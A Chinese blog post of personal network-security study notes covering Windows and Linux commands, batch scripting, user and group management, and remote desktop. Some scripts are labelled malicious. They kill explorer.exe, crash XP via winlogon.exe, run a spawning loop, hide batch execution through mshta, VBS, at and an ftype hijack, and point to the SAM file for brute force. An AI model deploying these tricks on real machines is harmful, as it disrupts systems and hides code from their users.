<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网络安全 学习笔记 | xin 的博客</title><meta name="author" content="xin"><meta name="copyright" content="xin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、windows创建定时任务参考链接 1）通过图形化界面创建win + R 键 ： 输入： taskschd.msc   回车   -》 创建基本任务 -》 按向导操作即可 2）通过编写脚本创建1234567schtasks &#x2F;create &#x2F;tn &quot;DailyBackup&quot; &#x2F;tr &quot;C:\backup.bat&quot; &#x2F;sc daily &#x2F;st 08:00&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="网络安全 学习笔记">
<meta property="og:url" content="https://blog.xintest.dpdns.org/2025/01/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="xin 的博客">
<meta property="og:description" content="一、windows创建定时任务参考链接 1）通过图形化界面创建win + R 键 ： 输入： taskschd.msc   回车   -》 创建基本任务 -》 按向导操作即可 2）通过编写脚本创建1234567schtasks &#x2F;create &#x2F;tn &quot;DailyBackup&quot; &#x2F;tr &quot;C:\backup.bat&quot; &#x2F;sc daily &#x2F;st 08:00&#x2F;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.xintest.dpdns.org/img/avatar.jpg">
<meta property="article:published_time" content="2025-01-03T01:58:12.000Z">
<meta property="article:modified_time" content="2025-01-06T02:55:37.823Z">
<meta property="article:author" content="xin">
<meta property="article:tag" content="encrypt">
<meta property="article:tag" content="网路安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.xintest.dpdns.org/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "网络安全 学习笔记",
  "url": "https://blog.xintest.dpdns.org/2025/01/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
  "image": "https://blog.xintest.dpdns.org/img/avatar.jpg",
  "datePublished": "2025-01-03T01:58:12.000Z",
  "dateModified": "2025-01-06T02:55:37.823Z",
  "author": [
    {
      "@type": "Person",
      "name": "xin",
      "url": "https://blog.xintest.dpdns.org"
    }
  ]
}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://blog.xintest.dpdns.org/2025/01/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":10,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '网络安全 学习笔记',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">xin 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">网络安全 学习笔记</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">网络安全 学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-03T01:58:12.000Z" title="Created 2025-01-03 09:58:12">2025-01-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-01-06T02:55:37.823Z" title="Updated 2025-01-06 10:55:37">2025-01-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/note/">note</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="一、windows创建定时任务"><a href="#一、windows创建定时任务" class="headerlink" title="一、windows创建定时任务"></a>一、windows创建定时任务</h1><p><a target="_blank" rel="noopener" href="https://wenku.baidu.com/view/7656b860954bcf84b9d528ea81c758f5f61f29c2.html?_wkts_=1703924390588&bdQuery=windows%E6%80%8E%E4%B9%88%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%AE%BE%E7%BD%AE%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1">参考链接</a></p>
<h2 id="1）通过图形化界面创建"><a href="#1）通过图形化界面创建" class="headerlink" title="1）通过图形化界面创建"></a>1）通过图形化界面创建</h2><p>win + R 键 ： 输入： taskschd.msc   回车   -》 创建基本任务 -》 按向导操作即可</p>
<h2 id="2）通过编写脚本创建"><a href="#2）通过编写脚本创建" class="headerlink" title="2）通过编写脚本创建"></a>2）通过编写脚本创建</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">schtasks /create /tn &quot;DailyBackup&quot; /tr &quot;C:\backup.bat&quot; /sc daily /st 08:00<br>//其中<br>schtasks：用于创建定时任务<br>/tn：参数指定任务名称<br>/tr：参数指定要执行的脚本文件路径<br>/sc：参数指定任务执行的频率<br>/st：参数指定任务开始的时间<br></code></pre></td></tr></table></figure>

<h2 id="3）通过命令行对定时任务的一些操作"><a href="#3）通过命令行对定时任务的一些操作" class="headerlink" title="3）通过命令行对定时任务的一些操作"></a>3）通过命令行对定时任务的一些操作</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">schtasks /query /tn &quot;DailyBackup&quot;    #查看任务信息<br>schtasks /delete /tn &quot;DailyBackup&quot; /f #删除任务<br></code></pre></td></tr></table></figure>

<h1 id="二、linux进程被kill-后，查看原因"><a href="#二、linux进程被kill-后，查看原因" class="headerlink" title="二、linux进程被kill 后，查看原因"></a>二、linux进程被kill 后，查看原因</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">dmesg | egrep -i -B100 &#x27;killed process&#x27; # 或者 <br>egrep -i &#x27;killed process&#x27; /var/log/messages <br>egrep -i -r &#x27;killed process&#x27; /var/log # 或者 <br>journalctl -xb | egrep -i &#x27;killed process&#x27;<br></code></pre></td></tr></table></figure>

<h1 id="三、安装windowsXp-和-windows2003后的优化过程"><a href="#三、安装windowsXp-和-windows2003后的优化过程" class="headerlink" title="三、安装windowsXp 和 windows2003后的优化过程"></a>三、安装windowsXp 和 windows2003后的优化过程</h1><p>1.安装系统（XP建议不要设置管理员密码）</p>
<p>2.调处桌面图标</p>
<p>3.安装vmware tools    （要重启）</p>
<p>4.磁盘管理（创建磁盘分区）（关闭更新，关闭防火墙）</p>
<p>5.做快照（建议关机后）</p>
<p>6.克隆虚拟机–链接克隆–修改计算机名称–快照</p>
<h1 id="四、隐藏磁盘分区"><a href="#四、隐藏磁盘分区" class="headerlink" title="四、隐藏磁盘分区"></a>四、隐藏磁盘分区</h1><p>在分配盘符的时候，选择第二个选项，将其映射到别的盘下的某个文件夹（事先创建好），最后修改图标</p>
<h1 id="五、将内存中的空间用作磁盘"><a href="#五、将内存中的空间用作磁盘" class="headerlink" title="五、将内存中的空间用作磁盘"></a>五、将内存中的空间用作磁盘</h1><p>好处：内存读取速度快，将一些程序产生的垃圾文件的目标地址指向这里，当电脑关机的时候，这些垃圾文件也会删除，电脑速度会变得较快一些，具体的教程网上搜索：需要下载类似Ramdisk的软件，用于将内存转化为硬盘使用，转化完成之后可以将浏览器的临时文件指向这里，这样电脑关机这些文件就会被删除，提高电脑的运行速度。</p>
<h1 id="六、windows命令大全"><a href="#六、windows命令大全" class="headerlink" title="六、windows命令大全"></a>六、windows命令大全</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">1.查看某个域名的地址信息、</span><br>nslookup www.baidu.com<br><span class="hljs-meta prompt_">#</span><span class="language-bash">2.打开系统自带的画图功能,win+R  直接输入即可</span><br>mspaint<br><span class="hljs-meta prompt_">#</span><span class="language-bash">3.监测延迟ping,指定发送多大的探测包</span><br>ping -l 2000 www.baidu.com<br>-t :表示一直ping<br>-n 数字：指定发送几个探测包<br><span class="hljs-meta prompt_">#</span><span class="language-bash">4.进入文件</span><br>type 文件名<br>分页显示： | more  ; 空格表示下一页<br><span class="hljs-meta prompt_">#</span><span class="language-bash">5.查看文件</span><br>dir  -&gt; dir /a<br><span class="hljs-meta prompt_">#</span><span class="language-bash">6.创建文件</span><br>echo 字符串 &gt;&gt; [路径]文件名    注意：&gt;&gt; ：为追加 ； &gt; : 为覆盖<br><span class="hljs-meta prompt_">#</span><span class="language-bash">7.编辑文件</span><br>copy con 文件名 -&gt; 进入编辑模式 -&gt; 回车保存 -&gt;Ctrl + C 退出<br><span class="hljs-meta prompt_">#</span><span class="language-bash">8.文件的删除</span><br>del 文件名 -&gt; 批量删除：del *.扩展名  -&gt; 删除所有的文件；del . (会有提示) -&gt; 无提示删除所有的文件: del . /s /q <br><span class="hljs-meta prompt_">#</span><span class="language-bash">9.隐藏文件或文件夹</span><br>隐藏：attrib +h 文件/文件夹<br>取消隐藏：attrib -h 文件/文件夹<br>+a :加上只读属性<br>+s :提升为受保护的系统级文件夹<br><span class="hljs-meta prompt_">#</span><span class="language-bash">10.强制关机或重启</span><br>shutdown -s -t 100  (-s 定时关机 -t 指定时间) 100s后关机<br>shutdown -r -t 100  (-r 定时重启 -t 指定时间) 100s后重启<br>shutdown -a 取消一切定时<br>shutdown -r -f -t 100 (-f 强制 )<br>shoudown -s -f -t 秒 -c &quot;字符串&quot;   字符串填写操作的原因<br><span class="hljs-meta prompt_">#</span><span class="language-bash">11.文件的移动</span><br>复制文件: copy 路径+文件名 路径+文件名<br>移动文件: move 路径+文件名 路径+文件名<br>文件的重命名: ren 旧名 新名<br>创建文件夹: md 名称<br><span class="hljs-meta prompt_">#</span><span class="language-bash">12.快速生成一个空文件</span><br>fsutil file createnew c:\system.ini xxx  (往c盘创建一个名为 system.ini ,大小为 xxx 的文件)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">13.修改文件的关联性</span><br>test.txx = exefile (以.exe来执行test.txt)  或者 test.txt = txtfile  (以.txt来执行test.txt)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">14.删除文件夹</span><br>rd <br><span class="hljs-meta prompt_">#</span><span class="language-bash">15.跨电脑复制文件</span><br>copy 文件名 \\10.1.1.2\路径<br><span class="hljs-meta prompt_">#</span><span class="language-bash">16.无视命令执行成功或报错</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">nul 2&gt;nul</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">17.查看所有进程、PID</span><br>netstat -aon<br><br>查看某个端口的信息<br>netstat -aon | findstr “端口”<br><br>查看PID对应的应用程序名<br>tasklist | findstr “PID”<br><span class="hljs-meta prompt_">#</span><span class="language-bash">18.查看当前用户的sid值</span><br>whoami /user   #账户密码的存储位置: c:\windows\system32\config\SAM    (暴力破解/撞库) windows系统上，默认密码最长的有效期42天(服务器)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">19.查看本机的所有开放的端口</span><br>netstat -an<br></code></pre></td></tr></table></figure>

<p>自己编写得一些dos脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">注意各个语句的用法</span><br>@echo off   #关闭回显<br>color 0a    #改变背景颜色<br>title xin-app v1.0    #设置标题<br>:menu      <br>  cls<br>  echo ========================<br>  echo      menu list:<br>  echo   1.shutdown the computer<br>  echo   2.cancel shutdown<br>  echo   3.exit <br>  echo ========================<br>echo.   #空一行<br>set /p num=please intput your choice:<br>if &quot;%num%&quot; == &quot;1&quot; goto 1    #if的判断语句<br>if &quot;%num%&quot; == &quot;2&quot; goto 2<br>if &quot;%num%&quot; == &quot;3&quot; goto 3<br>echo please don&#x27;t give a shit input!!!<br>pause    #暂停<br>goto menu      #跳转到某个代码段中<br><br>:1<br>  set /p time=please input the shutdown time (unit:s):  #读取用户输入的值，并赋值给time,  注意需要加上 /p <br>  shutdown -s -f -t %time%       #使用%time%取出之前定义的变量time的值<br>  goto menu<br><br>:2  #代码段，一般配合goto一起使用<br>  shutdown -a<br>  goto menu<br><br>:3<br>  exit    #程序的退出<br> <br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">恶意小dos</span><br>@echo off<br>color 0a<br>taskkill /im explorer.exe /f &gt;nul 2&gt;nul<br>echo Are you scared?<br>ping -n 10 127.0.0.1 &gt;nul 2&gt;nul<br>start c:\windows\explorer.exe<br>echo have fun!!!<br>pause<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> #</span><span class="language-bash">恶意命令  只针对xp或win2003生效 ，win7  win10已经不生效了</span><br> ntsd -c q -pn winlogon.exe   #强制杀死指定进程 winlogon.exe 进程，该进程为windows的登陆程序，但是该进程无法杀死，导致蓝屏<br> taskkill /im explorer.exe /f #强制杀死指定程序 explorer.exe  /im 指定程序   /f  强制<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">恶意小dos</span><br>:d<br>start<br>goto c<br>:c<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">隐藏dos窗口的几种方法</span><br>（1）mshta &quot;javascript:new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(&#x27;cmd /c D:/test.bat&#x27;,0);window.close()&quot;<br>（2）echo CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd /c D:/test.bat&quot;,0&gt;$tmp.vbs<br>	cscript.exe /e:vbscript $tmp.vbs<br>	del $tmp.vbs<br>（3）CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd /c D:/test.bat&quot;,0<br>（4）利用at计划任务<br>    用at可以建立一个计划任务，在不输入 /interactive 参数可以后台运行。但是建使用at必须有管理员权限<br>    at 09:10 &quot;cmd /c D:/Test.bat&quot;<br>    然后在 9:10 系统就会自动后台以SYSTEM权限运行这个bat<br>（5）利用ftype文件关联<br>    ftype batfile=C:/Windows/System32/mshta &quot;javascript:new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(&#x27;cmd 	/c%1&#x27;,0);window.close();&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">让DOS一直在后运行的代码，复制的，最好检查一下再运行，或者直接在虚拟机中运行</span><br>@echo oFF <br>::code by LZ-MyST QQ:8450919 BLOG:http://hi.baidu.com/lzmyst http://www.clxp.net.cn <br>if &quot;%1&quot; neq &quot;1&quot; ( <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-string">&quot;%temp%\tmp.vbs&quot;</span> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">set</span> WshShell = WScript.CreateObject^(^<span class="hljs-string">&quot;WScript.Shell^&quot;</span>^)</span> <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt;<span class="hljs-string">&quot;%temp%\tmp.vbs&quot;</span> <span class="hljs-built_in">echo</span> WshShell.Run chr^(34^) ^&amp; %0 ^&amp; chr^(34^) ^&amp; ^<span class="hljs-string">&quot; 1^&quot;</span>,0</span> <br>start /d &quot;%temp%&quot; tmp.vbs <br>exit <br>) <br>::从这里开始，就是你的批处理代码了，DOS黑框一闪而过，转到后台运行了 <br>pause <br>::你会在任务管理器看到有一个隐藏窗口的CMD进程<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">获取注册表中的某个键的值，仅限值为路径</span><br>@echo off<br>Setlocal enabledelayedexpansion    #延迟获取值<br><br>:: 设置注册表位置<br>set registryKey=hkcu\control panel\desktop    #设置需要获取的注册表的键值<br><br>:: 获取 UninstallString 项的值<br>::skip = 1 代表跳过第一行，delims=: 表示将值按:分割成多个元素<br>:: tokens=1,*  表示将分割后的多个元素，分成两部分，第一部分为第一个元素赋值给%%i，其余元素则为第二部分,赋值给%%j<br>for /f &quot;skip=1 delims=: tokens=1,*&quot; %%i in (&#x27;REG QUERY &quot;%registryKey%&quot; /v &quot;wallpaper&quot;&#x27;) do (<br>    set str=%%i<br>    set var=%%j<br>    :: !var:&quot;=!  表示将 var 的值中的 &quot; 替换成空<br>    set &quot;var=!var:&quot;=!&quot; <br>    :: ~代表切割，var:~2,-1 :从var的第三位开始截取到倒数第二位<br>    set value=&quot;!str:~-1!:!var!&quot;<br>)<br><br>:: 输出获取到的值（经过上面整个过程，就可以获取某个注册表中的某个键的路径值）<br>echo %value%<br>pause<br></code></pre></td></tr></table></figure>

<h1 id="Linux命令大全"><a href="#Linux命令大全" class="headerlink" title="Linux命令大全"></a>Linux命令大全</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure>

<h1 id="七、网安相关知识"><a href="#七、网安相关知识" class="headerlink" title="七、网安相关知识"></a>七、网安相关知识</h1><h2 id="1-用户和组的概念："><a href="#1-用户和组的概念：" class="headerlink" title="1.用户和组的概念："></a>1.用户和组的概念：</h2><p>​	1.1 用户概述：<br>​		（1）每个用户登陆系统后，拥有不同的操作权限<br>​		（2）每个账户有自己唯一的<strong>SID</strong>(安全标识符)<br>​		如下所示：<br>​		前面一串数字字母都是一样的，是<strong>系统id(SID)<strong>，不同的只有最后三位（</strong>用户ID:UID</strong>）：<br>​			用户的UID:500<br>​			<strong>windows系统管理员administrator的UID是500</strong><br>​			<strong>普通用户的UID是从1000开始的</strong><br>​	<strong>不同的账户拥有不同的权限，为不同的账户赋予权限，也就是为不同账户的SID赋予权限</strong></p>
<p><img src="C:\Users\新\Pictures\联想截图\联想截图_20240323025533.png"></p>
<p>​		（3）用户的SID的值：whoami &#x2F;user</p>
<p>​		  (4) 账户密码的存储位置: c:\windows\system32\config\SAM     #暴力破解&#x2F;撞库</p>
<p>​		（5）windows系统上，默认密码最长的有效期42天</p>
<p>​	1.2 电脑的本地用户和组</p>
<p>​		电脑中的用户一般分为两种：给用户使用的和给电脑程序使用的</p>
<p>​		（1）给用户使用：administrator , guest    (其中前者权限较高，后者权限<strong>最低</strong>)</p>
<p>​		（2）给程序使用的: System, Local Service, Network Service (其中 System的权限<strong>最高</strong>)</p>
<p>​	注意：（环境为win2003服务器）可以自己在用户和组的界面添加用户（所有的用户都可以在c盘下的 “document and setting中找到”，但必须登陆之后才会生成文件夹），但是添加的用户权限不高（非常低），不能够访问其它用户的“用户文件夹”，但是“administrator” 是可以访问其它普通用户的“文件夹”，甚至普通用户连关机的权限都没有（服务器不能随便关机），只能注销账户</p>
<h3 id="与用户相关的命令（net-user-开头）"><a href="#与用户相关的命令（net-user-开头）" class="headerlink" title="与用户相关的命令（net user 开头）"></a>与用户相关的命令（net user 开头）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user    #列出计算机的用户列表<br>net user 用户名  #给出该用户的信息<br>net user 用户名 1   #给用户修改密码（只有管理员能使用），密码修改为 1 <br>net user abc 123 /add   #新建一个用户  用户名：abc  密码：123<br>net user abc /del  #删除用户abc<br>net user /active:yes/no  #激活或禁用账户<br></code></pre></td></tr></table></figure>

<p>​	1.3 组的概述</p>
<p>​		1.3.1 组的作用：简化权限的赋予，一个用户可以属于多个组，将普通用户移入管理员组，其权限也不如真正的administrator</p>
<p>​		权限赋予的方式：</p>
<p>​			1）用户—组—-赋权限</p>
<p>​			2）用户—赋权限</p>
<p>​		1.3.2 内置组</p>
<p>​		内置组的权限默认已经被系统赋予</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.administrators    #管理员组<br>2.guests			#来宾组<br>3.users				#普通用户组（新建的用户）<br>4.network			#网络配置组<br>5.print				#打印组<br>6.Remote Desktop    #远程桌面组<br></code></pre></td></tr></table></figure>

<h3 id="与组相关的命令"><a href="#与组相关的命令" class="headerlink" title="与组相关的命令"></a>与组相关的命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup		#查看组列表<br>net localgroup 组名	#查看该组的成员<br>net localgruop 组名 /add	#创建一个新的组<br>net localgruop 组名 用户名 /add		#添加用户到组<br>net localgroup 组名 用户名 /del		#从组中踢出用户<br>net localgroup 组名 /del				#删除组<br></code></pre></td></tr></table></figure>

<h2 id="2-服务器远程管理"><a href="#2-服务器远程管理" class="headerlink" title="2.服务器远程管理"></a>2.服务器远程管理</h2><p>远程管理类型：远程桌面、telnet</p>
<h3 id="2-1-远程桌面"><a href="#2-1-远程桌面" class="headerlink" title="2.1 远程桌面"></a>2.1 远程桌面</h3><p>步骤：<br>1）配置网络，两台机器能够互相ping通<br>2）服务器开启允许被远程控制：桌面属性右键—远程设置—选择允许–确定<br>3）客户机上:win + R — 输入 mstsc<br>4）输入ip点击确认<br>5）输入连接服务器的账号和密码</p>
<p>注意：如果使用非管理员的账户登陆远程，需要在服务器上将用户加入到<strong>远程桌面内置组 Remote Desktop Users</strong>中</p>
